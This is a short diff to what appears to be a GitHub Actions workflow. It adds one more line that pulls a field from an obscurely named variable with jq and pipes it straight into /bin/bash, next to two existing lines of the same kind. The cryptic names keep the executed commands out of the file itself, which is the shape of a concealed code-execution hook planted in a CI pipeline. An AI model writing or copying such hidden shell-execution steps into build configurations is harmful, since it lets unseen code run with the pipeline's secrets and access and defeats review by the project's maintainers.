@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$wrpcd1600" | jq -r .n9639 | /bin/bash
           echo $ceo9 | jq -r .e563 | /bin/bash
+          printf '%s' "$sw985" | jq -r .p8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
